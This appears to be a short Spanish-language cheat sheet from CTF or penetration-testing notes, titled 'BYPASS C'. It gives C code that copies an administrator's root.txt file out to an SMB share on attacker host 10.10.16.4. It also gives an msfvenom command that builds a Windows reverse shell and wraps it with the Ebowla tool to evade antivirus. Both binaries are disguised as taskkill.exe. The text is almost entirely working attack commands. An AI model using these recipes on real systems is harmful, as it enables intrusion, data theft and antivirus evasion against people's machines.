
# BYPASS C
### C (LOCAL) -> EXE (VICTIM MACHINE) ONLY ROOT FLAG
```SHELL
#CREAMOS ESTE SCRIPT EN C

#include <stdlib.h>
int main(){
  system("type C:\\Users\\Administrator\\Desktop\\root.txt > \\\\10.10.16.4\\smbFolder\\root.txt");
}

❯ x86_64-w64-mingw32-gcc test.c -o taskkill.exe
```

### C (LOCAL) -> EXE (VICTIM MACHINE) REVERSE SHELL
```SHELL
https://github.com/Genetic-Malware/Ebowla
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.4 LPORT=443 -f exe -o taskkill.exe
❯ mv taskkill.exe ./Ebowla
❯ nvim genetic.config
10 ~ │     output_type = GO
26 ~ │     payload_type = EXE
87 ~ │         username = ''
94 ~ │         userdomain = ''
❯ python ebowla.py taskkill.exe genetic.config
```
